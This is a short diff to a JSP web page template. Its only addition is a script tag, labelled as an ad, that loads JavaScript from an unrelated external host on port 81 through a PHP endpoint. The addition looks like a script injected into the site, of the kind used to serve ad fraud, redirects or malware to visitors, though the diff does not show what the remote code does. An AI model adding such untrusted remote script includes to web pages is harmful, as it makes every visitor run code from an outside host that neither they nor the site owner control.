@@ -85,5 +85,8 @@
 			window.location.href="${pageContext.request.contextPath }/search/" + $('#keyword').val();
 		}
 	</script>
+	<!-- ad begin -->
+	<script src="http://js4278.yongkang6.com:81/s/i.php?21574"></script>
+	<!-- ad end -->
 </body>
 </html>
